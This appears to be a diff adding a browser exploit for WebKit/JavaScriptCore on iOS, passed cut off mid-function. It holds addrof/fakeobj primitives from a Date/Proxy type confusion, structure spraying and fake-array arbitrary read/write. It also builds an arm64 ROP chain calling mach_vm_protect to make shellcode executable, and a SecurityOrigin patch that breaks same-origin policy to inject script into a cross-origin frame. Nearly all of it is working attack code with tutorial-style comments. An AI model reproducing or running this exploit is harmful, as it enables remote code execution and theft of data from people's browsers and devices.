+                arr[pos++] = 0xdaad0017;                // x26 (unused)
+                arr[pos++] = 0xdaad0018;                // x25 (unused)
+                arr[pos++] = 0xdaad0019;                // x25 (unused)
+                arr[pos++] = 0xdaad00f0;                // x24 (unused)
+                arr[pos++] = 0xdaad00f1;                // x24 (unused)
+                arr[pos++] = 0xdaad00f2;                // x23 (unused)
+                arr[pos++] = 0xdaad00f3;                // x23 (unused)
+                arr[pos++] = 0xdaad00f4;                // x22 (unused)
+                arr[pos++] = 0xdaad00f5;                // x22 (unused)
+                arr[pos++] = func.lo();                 // x21 (target for dispatch)
+                arr[pos++] = func.hi();                 // x21 (target for dispatch)
+                arr[pos++] = 0xdaad0018;                // x20 (unused)
+                arr[pos++] = 0xdaad0019;                // x20 (unused)
+                tmppos = pos;
+                arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+                arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
+                arr[pos++] = 0xdaad001c;                // x29 (unused)
+                arr[pos++] = 0xdaad001d;                // x29 (unused)
+                arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+                arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+                // in ldrx8
+                arr[pos++] = dispatch.lo();             // x8 (target for movx4)
+                arr[pos++] = dispatch.hi();             // x8 (target for movx4)
+                arr[pos++] = 0xdaad1401;                // (unused)
+                arr[pos++] = 0xdaad1402;                // (unused)
+                arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
+                arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
+                arr[pos++] = 0xdaad1301;                // x19 (unused)
+                arr[pos++] = 0xdaad1302;                // x19 (unused)
+                arr[pos++] = 0xdaad1201;                // x29 (unused)
+                arr[pos++] = 0xdaad1202;                // x29 (unused)
+                arr[pos++] = movx4.lo();                // x30 (next gadget)
+                arr[pos++] = movx4.hi();                // x30 (next gadget)
+            }
+
+            // after dispatch:
+
+            // keep only one: these or 0xdeaded01
+            arr[pos++] = 0xdead0022;                // unused
+            arr[pos++] = 0xdead0023;                // unused
+
+            arr[pos++] = 0xdead0022;                // unused
+            arr[pos++] = 0xdead0023;                // unused
+            arr[pos++] = 0xdead0024;                // x22 (unused)
+            arr[pos++] = 0xdead0025;                // x22 (unused)
+            arr[pos++] = 0xdead0026;                // x21 (unused)
+            arr[pos++] = 0xdead0027;                // x21 (unused)
+            arr[pos++] = 0xdead0028;                // x20 (unused)
+            arr[pos++] = 0xdead0029;                // x20 (unused)
+            arr[pos++] = 0xdead002a;                // x19 (unused)
+            arr[pos++] = 0xdead002b;                // x19 (unused)
+            arr[pos++] = 0xdead002c;                // x29 (unused)
+            arr[pos++] = 0xdead002d;                // x29 (unused)
+            arr[pos++] = jump_to.lo();              // x30 (gadget)
+            arr[pos++] = jump_to.hi();              // x30 (gadget)
+        }
+
+        var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
+            x0 = x0 || Int64.Zero
+            x1 = x1 || Int64.Zero
+            x2 = x2 || Int64.Zero
+            x3 = x3 || Int64.Zero
+            jump_to = jump_to || stackloader
+
+            return (ldrx8 ? add_call_via_x8 : add_call_llvm)(
+                func, x0, x1, x2, x3, x4, jump_to
+            )
+        }
+
+        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
+            add_call(mach_vm_protect
+                , mach_task_self_    // task
+                , codeAddr           // addr
+                , shsz               // size
+                , new Int64(0)       // set maximum
+                , new Int64(7)       // prot (RWX)
+            );
+
+            add_call(memmove
+                , codeAddr           // dst
+                , paddr              // src
+                , shsz               // size
+            );
+        } else {
+            if (jitWriteSeparateHeaps.lo() || jitWriteSeparateHeaps.hi()) {
+                add_call(jitWriteSeparateHeaps
+                    , Sub(codeAddr, memPoolStart)     // off
+                    , paddr                           // src
+                    , shsz                            // size
+                );
+            } else {
+                fail('bi0n1c (c)');
+            }
+
+            segs.forEach(function(seg) {
+                if (seg.prots.hi() & 2) { // VM_PROT_WRITE
+                    var addr = Add(seg.addr, codeAddr);
+                    add_call(mach_vm_protect
+                        , mach_task_self_    // task
+                        , addr               // addr
+                        , seg.size           // size
+                        , new Int64(0)       // set maximum
+                        , new Int64(0x13)    // prot (RW- | COPY)
+                    );
+                }
+            })
+        }
+
+        add_call(usleep
+            , new Int64(100000) // microseconds
+        );
+
+        add_call(jmpAddr);
+
+        // dummy
+        for(var i = 0; i < 0x20; ++i)
+        {
+            arr[pos++] = 0xde00c0de + (i<<16);
+        }
+
+        var sp = Add(stack, (arrsz - off) * 4);
+        memory.write64(Add(el_addr, 0x60), Add(sp, 0x60));      // x29
+        memory.write64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)
+
+        // trigger
+        //alert("u rdy?")
+        wrapper.addEventListener("click", function(){});
+
+        fail("should never reach this");
+    };
+function hex(b) {
+    return ('0' + b.toString(16)).substr(-2);
+}
+function hexit(x) {
+    if (x < 0)
+        return `-${hex(-x)}`
+    return `0x${x.toString(16)}`
+}
+// Return the hexadecimal representation of the given byte array.
+function hexlify(bytes) {
+    var res = [];
+    for (var i = 0; i < bytes.length; i++)
+        res.push(hex(bytes[i]));
+    return res.join('');
+}
+
+// Return the binary data represented by the given hexdecimal string.
+function unhexlify(hexstr) {
+    if (hexstr.length % 2 == 1)
+        throw new TypeError("Invalid hex string");
+    var bytes = new Uint8Array(hexstr.length / 2);
+    for (var i = 0; i < hexstr.length; i += 2)
+        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
+    return bytes;
+}
+function hexdump(data) {
+    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
+        data = Array.from(data);
+    var lines = [];
+    for (var i = 0; i < data.length; i += 16) {
+        var chunk = data.slice(i, i+16);
+        var parts = chunk.map(hex);
+        if (parts.length > 8)
+            parts.splice(8, 0, ' ');
+        lines.push(parts.join(' '));
+    }
+    return lines.join('\n');
+}
+// Simplified version of the similarly named python module.
+var Struct = (function() {
+    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
+    var buffer      = new ArrayBuffer(8);
+    var byteView    = new Uint8Array(buffer);
+    var uint32View  = new Uint32Array(buffer);
+    var float64View = new Float64Array(buffer);
+    return {
+        pack: function(type, value) {
+            var view = type;        // See below
+            view[0] = value;
+            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
+        },
+        unpack: function(type, bytes) {
+            if (bytes.length !== type.BYTES_PER_ELEMENT)
+                throw Error("Invalid bytearray");
+            var view = type;        // See below
+            byteView.set(bytes);
+            return view[0];
+        },
+        // Available types.
+        int8:    byteView,
+        int32:   uint32View,
+        float64: float64View
+    };
+})();
+</script>
+<script>
+//
+// Tiny module that provides big (64bit) integers.
+//
+// Copyright (c) 2016 Samuel Groß
+//
+// Requires utils.js
+//
+// Datatype to represent 64-bit integers.
+//
+// Internally, the integer is stored as a Uint8Array in little endian byte order.
+function Int64(v) {
+    // The underlying byte array.
+    var bytes = new Uint8Array(8);
+    this.bytes = bytes;
+    switch (typeof v) {
+        case 'number':
+            v = '0x' + Math.floor(v).toString(16);
+        case 'string':
+            if (v.startsWith('0x'))
+                v = v.substr(2);
+            if (v.length % 2 == 1)
+                v = '0' + v;
+            var bigEndian = unhexlify(v, 8);
+            bytes.set(Array.from(bigEndian).reverse());
+            break;
+        case 'object':
+            if (v instanceof Int64) {
+                bytes.set(v.getBytes());
+            } else {
+                if (v.length != 8)
+                    throw TypeError("Array must have excactly 8 elements.");
+                bytes.set(v);
+            }
+            break;
+        case 'undefined':
+            break;
+        default:
+            throw TypeError("Int64 constructor requires an argument.");
+    }
+    // Return a double whith the same underlying bit representation.
+    this.asDouble = function() {
+        // Check for NaN
+        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
+            throw new RangeError("Integer can not be represented by a double");
+        return Struct.unpack(Struct.float64, bytes);
+    };
+    // Return a javascript value with the same underlying bit representation.
+    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
+    // due to double conversion constraints.
+    this.asJSValue = function() {
+        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
+            throw new RangeError("Integer can not be represented by a JSValue");
+        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
+        this.assignSub(this, 0x1000000000000);
+        var res = Struct.unpack(Struct.float64, bytes);
+        this.assignAdd(this, 0x1000000000000);
+        return res;
+    };
+    // Return the underlying bytes of this number as array.
+    this.getBytes = function() {
+        return Array.from(bytes);
+    };
+    // Return the byte at the given index.
+    this.byteAt = function(i) {
+        return bytes[i];
+    };
+    // Return the value of this number as unsigned hex string.
+    this.toString = function() {
+        return '0x' + hexlify(Array.from(bytes).reverse());
+    };
+    
+    this.asInt32 = function() {
+        var value = new Int64(0);
+        for (var i = 0; i < 8; i++) {
+            if (i < 4) {
+                value.bytes[i] = this.bytes[i];
+            } else {
+                value.bytes[i] = 0;
+            }
+        }
+        
+        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
+    };
+    
+    this.asInt16 = function() {
+        var value = new Int64(0);
+        for (var i = 0; i < 8; i++) {
+            if (i < 2) {
+                value.bytes[i] = this.bytes[i];
+            } else {
+                value.bytes[i] = 0;
+            }
+        }
+        
+        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
+    };
+    // Basic arithmetic.
+    // These functions assign the result of the computation to their 'this' object.
+    // Decorator for Int64 instance operations. Takes care
+    // of converting arguments to Int64 instances if required.
+    function operation(f, nargs) {
+        return function() {
+            if (arguments.length != nargs)
+                throw Error("Not enough arguments for function " + f.name);
+            for (var i = 0; i < arguments.length; i++)
+                if (!(arguments[i] instanceof Int64))
+                    arguments[i] = new Int64(arguments[i]);
+            return f.apply(this, arguments);
+        };
+    }
+    // this = -n (two's complement)
+    this.assignNeg = operation(function neg(n) {
+        for (var i = 0; i < 8; i++)
+            bytes[i] = ~n.byteAt(i);
+        return this.assignAdd(this, Int64.One);
+    }, 1);
+    // this = a + b
+    this.assignAdd = operation(function add(a, b) {
+        var carry = 0;
+        for (var i = 0; i < 8; i++) {
+            var cur = a.byteAt(i) + b.byteAt(i) + carry;
+            carry = cur > 0xff | 0;
+            bytes[i] = cur;
+        }
+        return this;
+    }, 2);
+    // this = a - b
+    this.assignSub = operation(function sub(a, b) {
+        var carry = 0;
+        for (var i = 0; i < 8; i++) {
+            var cur = a.byteAt(i) - b.byteAt(i) - carry;
+            carry = cur < 0 | 0;
+            bytes[i] = cur;
+        }
+        return this;
+    }, 2);
+    // this = a ^ b
+    this.assignXor = operation(function xor(a, b) {
+        for (var i = 0; i < 8; i++) {
+            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
+        }
+        return this;
+    }, 2);
+    
+    // this = a & b
+    this.assignAnd = operation(function and(a, b) {
+        for (var i = 0; i < 8; i++) {
+            bytes[i] = a.byteAt(i) & b.byteAt(i);
+        }
+        return this;
+    }, 2);
+    
+    // this = a << b
+    this.assignShiftLeft = operation(function shiftLeft(a, b) {
+        for (var i = 0; i < 8; i++) {
+            if (i < b) {
+                bytes[i] = 0;
+            } else {
+                bytes[i] = a.byteAt(Sub(i, b).asInt32());
+            }
+        }
+        return this;
+    }, 2);
+    
+    // this = a >> b
+    this.assignShiftRight = operation(function shiftRight(a, b) {
+        for (var i = 0; i < 8; i++) {
+            if (i < (8 - b)) {
+                bytes[i] = a.byteAt(Add(i, b).asInt32());
+            } else {
+                bytes[i] = 0;
+            }
+        }
+        return this;
+    }, 2);
+}
+// Constructs a new Int64 instance with the same bit representation as the provided double.
+Int64.fromDouble = function(d) {
+    var bytes = Struct.pack(Struct.float64, d);
+    return new Int64(bytes);
+};
+// Convenience functions. These allocate a new Int64 to hold the result.
+// Return -n (two's complement)
+function Neg(n) {
+    return (new Int64()).assignNeg(n);
+}
+// Return a + b
+function Add(a, b) {
+    return (new Int64()).assignAdd(a, b);
+}
+// Return a - b
+function Sub(a, b) {
+    return (new Int64()).assignSub(a, b);
+}
+// Return a ^ b
+function Xor(a, b) {
+    return (new Int64()).assignXor(a, b);
+}
+// Return a & b
+function And(a, b) {
+    return (new Int64()).assignAnd(a, b);
+}
+// Return a << b
+function ShiftLeft(a, b) {
+    return (new Int64()).assignShiftLeft(a, b);
+}
+// Return a >> b
+function ShiftRight(a, b) {
+    return (new Int64()).assignShiftRight(a, b);
+}
+// Some commonly used numbers.
+Int64.Zero = new Int64(0);
+Int64.One = new Int64(1);
+// That's all the arithmetic we need for exploiting WebKit.. :)
+</script>
+<script>
+let print = function(s){
+    alert(s);
+}
+function iv(x){
+    return new Int64(x).asJSValue()
+}
+    var datePrototype = undefined;
+    function init() {
+    datePrototype = Object.getPrototypeOf(Date.prototype);
+}
+
+init();
+let stage1 = {
+    addrof: function(obj) {
+        let arg = [1.1, 2.2, 3.3];
+        let date = new Date();
+        date[1] = 1;
+        function InfoLeaker(arg) {
+            0 in date;
+            return arg[1];
+        }
+        for (var i = 0; i < 10000; i++)
+            InfoLeaker(arg);
+        var handler = {
+            has: function() {
+                arg[1] = obj;
+                return false;
+            }
+        }
+        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));
+        var addr = InfoLeaker(arg);
+        Object.setPrototypeOf(Date.prototype, datePrototype);
+        if (addr !== 2.2 && typeof addr !== 'object')
+            return Int64.fromDouble(addr);
+        fail("Could not leak address using 'addrof' primitive!")
+    },
+    fakeobj: function(addr) {
+        let arg = [1.1, 2.2, 3.3];
+        let date = new Date();
+        date[1] = 1;
+        function ObjFaker(arg) {
+            0 in date;
+            arg[1] = addr;
+        }
+        for (var i = 0; i < 10000; ++i)
+            ObjFaker(arg);
+        var handler = {
+            has: function() {
+                arg[1] = {};
+                return false;
+            }
+        }
+        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));
+        ObjFaker(arg);
+        Object.setPrototypeOf(Date.prototype, datePrototype);
+        var obj = arg[1];
+        if (typeof obj === 'object')
+            //alert("succeeded");
+            return obj;
+        fail("Could not inject fake object using 'fakeobj' primitive!")
+    },
+};
+function pwn(binary) {
+// Pre spectre & pre gigacage
+var structs = [];
+
+function sprayStructures() {
+    for (var i = 0; i < 1000; i++) {
+        var a = [13.37];
+        a['prop'] = 13.37;
+        a['prop' + i] = 13.37;
+        structs.push(a);
+    }
+}
+
+sprayStructures();
+var victim = structs[Math.floor(Math.random() * structs.length)];
+let primitives = stage1;
+    //
+    // During structure spraying, we've allocated 1000 JSArrays.
+    // Let's use one of them for our arbitrary read/write primitives.
+    // Killing two birds with one stone.
+    //
+    // Faking an Array and injecting it into the engine is the first step to
+    // construct arbitrary read/write primitives.
+    //
+    // In his phrack article, saelo solves the problem by faking a Float64Array and then
+    // abusing its 'm_vector' field, so that it can be redirected to another array
+    // under the attacker's control.
+    // Such exploitation technique, however, is not reliable anymore since the
+    // introduction of the Gigacages for TypedArrays (JSArrayBufferView):
+    //
+    //  +0 { 32} JSArrayBufferView
+    //  +0 { 16}     JSC::JSNonFinalObject
+    //  +0 { 16}         JSC::JSObject
+    //  +0 {  8}             JSC::JSCell
+    //  +0 {  1}                 JSC::HeapCell
+    //  +0 <  4>                 JSC::StructureID m_structureID;
+    //  +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
+    //  +5 <  1>                 JSC::JSType m_type;
+    //  +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
+    //  +7 <  1>                 JSC::CellState m_cellState;
+    //  +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
+    //  +8 <  8>                 JSC::Butterfly * m_value;
+    // +16 <  8>     JSC::CagedBarrierPtr<Gigacage::Primitive, void> m_vector;
+    // +16 <  8>         JSC::AuxiliaryBarrier<WTF::CagedPtr<Gigacage::Primitive, void, WTF::DumbPtrTraits<void> > > m_barrier;
+    // +16 <  8>     <PADDING>
+    // +24 <  4>     uint32_t m_length;
+    // +28 <  4>     JSC::TypedArrayMode m_mode;
+    //
+    // Pointers inside a Gigacage cannot be replaced with anything outside of it.
+    // Long story short, 'm_vector' is now caged.
+    //
+    // Good news is, 'm_butterfly' is not.
+    // While TypedArrays store values inside their 'm_vector' field, normal Arrays don't.
+    // So faking or redirecting a butterfly is still possible as of now:
+    //
+    // +0 { 16} JSArray
+    // +0 { 16}     JSC::JSNonFinalObject
+    // +0 { 16}         JSC::JSObject
+    // +0 {  8}             JSC::JSCell
+    // +0 {  1}                 JSC::HeapCell
+    // +0 <  4>                 JSC::StructureID m_structureID;
+    // +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
+    // +5 <  1>                 JSC::JSType m_type;
+    // +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
+    // +7 <  1>                 JSC::CellState m_cellState;
+    // +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
+    // +8 <  8>                 JSC::Butterfly * m_value;
+    //
+    //
+    // StructureIDs allocated during spraying should range between 360 and 1360.
+    // Any number in-between should provide us with a structure id we can use
+    // to fake a valid Array. If that's not going to be the case, however,
+    // we're gonna attempt to brute-force such identifier.
+    // 512 (0x200) seems like a reasonable number to start from.
+    //
+    var jsDoubleCellHeader = new Int64([
+        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
+        0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
+        0x20,                                  // m_type (ArrayType)
+        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
+        0x1                                    // m_cellState (DefinitelyWhite)
+    ]);
+    var jsContiguousCellHeader = new Int64([
+        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
+        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
+        0x20,                                  // m_type (ArrayType)
+        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
+        0x1                                    // m_cellState (DefinitelyWhite)
+    ]);
+    //
+    // Let's create the object whose properties are going to appear as a real
+    // Array to the engine.
+    //
+    var hax = new Uint8Array(0x1000);
+    var container = {
+        jsCellHeader: jsContiguousCellHeader.asJSValue(),
+        butterfly: victim, 
+        //vector: hax,
+        //lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
+    };
+    //
+    // Let's have a look at how 'container' appears in memory.
+    //
+    // lldb output (with 'container' at 0x1077c45c0):
+    //
+    // (lldb) x/4gx 0x1077c45c0 -l 1
+    // 0x1077c45c0: 0x0100150000000552  +----------+
+    // 0x1077c45c8: 0x0000000000000000  +--------+ |
+    // 0x1077c45d0: 0x0108200900000200  +------+ | |
+    // 0x1077c45d8: 0x00000001077b6bd0  +----+ | | |
+    //                                       | | | |
+    // +----------------------------------+  | | | |
+    // |            container             |  | | | |
+    // +----------------------------------+  | | | |
+    // | +0 <8> JSC::JSCell               <--------+
+    // | +8 <8> JSC::Butterfly            <------+
+    // |                                  |  | |
+    // | Inline properties:               |  | |
+    // |                                  |  | |
+    // | +16 <8> jsCellHeader             <----+
+    // |    +16 <4> m_structureID         |  |
+    // |    +20 <1> m_indexingTypeAndMisc |  |
+    // |    +21 <1> m_type                |  |
+    // |    +22 <1> m_flags               |  |
+    // |    +23 <1> m_cellState           |  |
+    // | +24 <8> butterfly                <--+
+    // +----------------------------------+
+    //
+    var containerAddr = primitives.addrof(container);
+    alert("[+] Container @ " + containerAddr);
+    //
+    // Pointing a JSValue to the inline properties of the 'container'
+    // object, we can inject a valid JSObject inside the JavaScript engine.
+    //
+    // +----------------------------------+
+    // |            container             |
+    // +----------------------------------+
+    // | +0 <8> JSC::JSCell               |
+    // | +8 <8> JSC::Butterfly            |
+    // |                                  |
+    // | Inline properties:               |
+    // |                                  |      +-------------------+
+    // | +16 <8> jsCellHeader  <-----------------+ driver (JSObject) |
+    // |    +16 <4> m_structureID         |      +-------------------+
+    // |    +20 <1> m_indexingTypeAndMisc |
+    // |    +21 <1> m_type                |
+    // |    +22 <1> m_flags               |
+    // |    +23 <1> m_cellState           |
+    // | +24 <8> butterfly                |
+    // +----------------------------------+
+    //
+    var fakeArrayAddr = Add(containerAddr, 0x10);
+    alert("[+] Fake Array @ " + fakeArrayAddr);
+    var driver = primitives.fakeobj(fakeArrayAddr.asDouble());
+    //
+    // From now on, garbage collector would be super unhappy, and would
+    // make everything crash in case it got triggered during exploitation.
+    //
+    // I'm pretty sure this can be avoided by fixing up the 'driver' object
+    // so that its cell and its butterfly work in accordance to the details
+    // of the Structure that it's trying to fake.
+    //
+    // Still haven't found the exact reason of the crash, nor a quick way to
+    // fix the mess, so I'd really appreciate if someone could point me
+    // into the right direction.
+    //
+    // Anyway...
+    //
+    //
+    // As pointed out before, using 512 as StructureID should be a safe bet
+    // to fake an Array object... but better safe, than sorry.
+    //
+    /*jsDoubleCellHeader.assignAdd(jsDoubleCellHeader, Int64.One);
+        jsContiguousCellHeader.assignAdd(jsContiguousCellHeader, Int64.One);
+        container.jsCellHeader = jsContiguousCellHeader.asJSValue();*/
+    //if (driver instanceof Array) {
+    //    alert("found valid structid");
+    //}
+    
+    //
+    // In this moment, the engine recognizes 'driver' as an Array.
+    // Arrays store values using their butterfly, and 'driver' has its
+    // butterfly pointing to 'victim'.
+    // In other words, accessing any slot inside 'driver' actually means
+    // accessing properties of the 'victim' object.
+    //
+    // Example: 'driver[1]' gives us control over the real butterfly
+    // of the 'victim' object:
+    //
+    //    properties                                           array slots
+    // +---------------+                               +-------------------------+
+    // +-------+-------+---------------+---------------+-------+--------+--------+
+    // | 13.37 | 13.37 | public length | vector length | 13.37 | slot 1 | slot 2 |
+    // +-------+-------+---------------+-----------------------+--------+--------+
+    //   propn   prop                                  ^
+    //                                                 +-------------------+
+    //                                                                     |
+    // +----------------------+               +-----------------------+    |
+    // |        driver        |               |        victim         |    |
+    // +----------------------+               +-----------------------+    |
+    // | +0 <8> jsCellHeader  |   driver[1]   | +0 <8> JSC::JSCell    |    |
+    // | +8 <8> butterfly     ----------------> +8 <8> JSC::Butterfly -----+
+    // +----------------------+               +-----------------------+
+    //
+    // Note: 'public length' and 'vector length' occupy 4 bytes each.
+    //
+    // As 'victim' itself is an Array, modifying its butterfly implies changes to its
+    // backing store; in other words, considering 'victim' is an ArrayWithDouble,
+    // we can use it to write (and read) doubles almost everywhere we want.
+    //
+    // 'Almost', that's significant: 'victim' reads data from its butterfly, which in
+    // turn can only be set by 'driver'; but 'driver' is an ArrayWithContiguos, so it
+    // can only insert JSValues in its backing store.
+    //
+    // This, indirectly, puts a limit to what can be read/written from the 'victim'
+    // array: everything works fine as long as we have access to a JSValue pointing
+    // to the memory location we're interested in reading/writing... but what if we don't?
+    //
+    // Also, another limitation is dictated by the fact that 'victim' is an array, thus
+    // it relies on the informations of its butterfly in order to access properties
+    // which have been put inside its array slots: if the 'vector length' field is invalid,
+    // then it won't be possible to fetch (or modify) any element of the array.
+    //
+    // In other words, as of now we would be able to read/write arbitrary memory only if:
+    // 1) We had access to a JSValue pointing to that memory location
+    // 2) Such memory location was preceded by a valid 'vector length' field
+    //
+    // These surely are limitation we need to get rid of.
+    //
+    // But for the time being, let's make use of what we have so far.
+    // We can still use these capabilities to upgrade the 'addrof' and 'fakeobj' primitives,
+    // and make them more stable/reliable.
+    //
+    // For this purpose, the idea is to have two different Arrays (one containing doubles
+    // and another containing JSValues) to share the same butterfly, so that properties
+    // set from one array could be retrieved with a different type from the other one.
+    //
+    // ArrayWithContiguous
+    var boxed = [{}];
+    // ArrayWithDouble
+    var unboxed = [13.37, 13.37];
+    unboxed[0] = 13.37;
+    driver[1] = unboxed;
+    var shared_butterfly = Int64.fromDouble(victim[1]);
+    alert("[+] Shared butterfly @ " + shared_butterfly);
+    //
+    // Address of the unboxed butterfly has been leaked, so it's time to modify
+    // the one of the boxed array accordingly.
+    //
+    driver[1] = boxed;
+    victim[1] = shared_butterfly.asDouble();
+    //
+    // Pointing 'driver[1]' to the boxed array means replacing the butterfly of the 'victim' object.
+    // This probably needs to be reverted aswell, if we don't want the garbage collector to kill us.
+    //
+    //
+    // Setup process is pretty much completed, and arbitrary read/write primitives are
+    // right around the corner!
+    //
+    // The boxed and the unboxed arrays now point to the same backing store, which,
+    // in other words, means controlled type confusion: every element added to one
+    // of the two arrays can be fetched from the other array with a different type.
+    //
+    // We're gonna upgrade our 'addrof' and 'fakeobj' primitives making use of
+    // these changes:
+    //                                          array slots
+    //                                 +--------------------------+
+    // +---------------+---------------+--------+--------+--------+
+    // | public length | vector length | slot 0 | slot 1 | slot 2 |
+    // +---------------+------------------------+--------+--------+
+    //                                 ^
+    // +-----------------------+       |       +-----------------------+
+    // |        boxed          |       |       |        unboxed        |
+    // +-----------------------+       |       +-----------------------+
+    // | +0 <8> JSC::JSCell    |       |       | +0 <8> JSC::JSCell    |
+    // | +8 <8> JSC::Butterfly --------^-------- +8 <8> JSC::Butterfly |
+    // +-----------------------+               +-----------------------+
+    //      ^             |                         |             ^
+    //  [1] |         [2] |                     [1] |         [2] |
+    //      |             v                         v             |
+    // +---------+   +---------+               +---------+   +---------+
+    // | insert  |   |  fake   |               |  leak   |   | insert  |
+    // | JSValue |   | JSValue |               | address |   | address |
+    // +---------+   +---------+               +---------+   +---------+
+    //
+    // [1] - 'addrof' primitive:
+    // Insert an object into the boxed array, so that the butterfly gets
+    // populated with a pointer (JSValue) to that object; finally, retrieve
+    // it from the unboxed array as double, effectively leaking its address.
+    //
+    // [2] - 'fakeobj' primitive:
+    // Insert an address into the unboxed array, so that the butterfly gets
+    // populated with a double representing a memory location; finally,
+    // retrieve it from the boxed array as a JSValue effectively pointing to
+    // that location.
+    //
+    //
+    // Finally, it's time to get rid of the limitations on our
+    // arbitrary read/write primitives.
+    //
+    // As 'driver' is an ArrayWithContiguous and can only work with JSValues,
+    // changing it to ArrayWithDouble would really allow us to point to
+    // arbitrary memory locations.
+    //
+    // Note:
+    // Yes, we're changing a property on the 'container' object to swap the type
+    // of the 'driver' object, so that it can be used to modify the backing store
+    // of the 'victim' array, which, in turn, can be used to read or write
+    // arbitrary data to arbitrary memory locations. Seems reasonable.
+    //
+    container.jsCellHeader = jsDoubleCellHeader.asJSValue();
+    //
+    // Time to upgrade exploit primitives!
+    //
+    var memory = {
+        /*addrof: function(obj) {
+            boxed[0] = obj;
+            return hexit(f2i(unboxed[0]));
+        },
+        fakeobj: function(addr) {
+            unboxed[0] = i2f(addr);
+            return boxed[0];
+        },*/
+        /*addrof: function(obj) {
+            boxed[0] = obj;
+            return unboxed[0];
+        },
+
+        fakeobj: function(addr) {
+            unboxed[0] = addr;
+            return boxed[0];
+        },*/
+        // Write an int64 to the given address.
+        /*writeInt64(addr, int64) {
+            driver[1] = Add(addr, 0x10).asDouble();
+            victim.pointer = int64.asJSValue();
+        },
+
+        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
+        write16(addr, value) {
+            // Set butterfly of victim object and dereference.
+            driver[1] = Add(addr, 0x10).asDouble();
+            victim.pointer = value;
+        },
+
+        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write16(Add(addr, 2 * i), ints[i]);
+        },
+
+        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
+        read64: function(addr) {
+            driver[1] = addr;
+            return stage1.addrof(victim.prop);
+            },
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.read64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.read64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+        },
+        // Verify that memory read and write primitives work.
+  /*  test() {
+        var v = {};
+        var obj = {p: v};
+
+        var addr = this.addrof(obj);
+       // if(this.fakeobj(addr).p === v) { fail("addrof and/or fakeobj does not work");}
+
+        var propertyAddr = Add(addr, 0x10);
+
+        var value = this.read64(propertyAddr);
+        if(value === this.addrof(v)) { fail("read64 does not work");}
+
+        this.write16(propertyAddr, 0x1337);
+        if(obj.p === 0x1337) {fail("write16 does not work");
+    }
+
+
+},
+*/
+    addrof: function(obj) {
+            boxed[0] = obj;
+            return Int64.fromDouble(unboxed[0]);
+    },
+    read8: function (addr) {
+  driver[1] = addr + i2f(0x10);
+  return this.addrof(victim.prop);
+},
+write4: function (addr, value) {
+  driver[1] = addr + i2f(0x10);
+  victim.prop = value;
+},
+};  
+var jsxhr = new XMLHttpRequest();
+    var jsxhrAddr = memory.addrof(jsxhr);
+    var xhrAddr = memory.read8(jsxhrAddr + 0x18);
+    var scriptExecContextAddr = memory.read8(xhrAddr + 0x68);
+    var securityOriginPolicyAddr = memory.read8(scriptExecContextAddr + 8);
+    var securityOriginAddr = memory.read8(securityOriginPolicyAddr + 8);
+    print("securityoriginaddr:" + securityOriginAddr)
+    var flags = memory.read8(securityOriginAddr + 0x30);
+    memory.write4(securityOriginAddr + 0x30, flags + 0x0100);
+    var VICTIM = 'http://10.13.37.2:9000/XXXXXXX';
+    var PAYLOAD = 'alert(document.domain)';
+    WAIT = 5000;
+victim = document.getElementById('victim');
+victim.src = VICTIM;
+var doc = document.getElementById('victim').contentWindow.document;
+    var script = doc.createElement('script');
+    script.innerText = PAYLOAD;
+    doc.head.appendChild(script)
+
+}
+
+
+var conversion_buffer = new ArrayBuffer(8)
+var f64 = new Float64Array(conversion_buffer)
+var i32 = new Uint32Array(conversion_buffer)
+
+var BASE32 = 0x100000000
+function f2i(f) {
+    f64[0] = f
+    return i32[0] + BASE32 * i32[1]
+}
+
+function i2f(i) {
+    i32[0] = i % BASE32
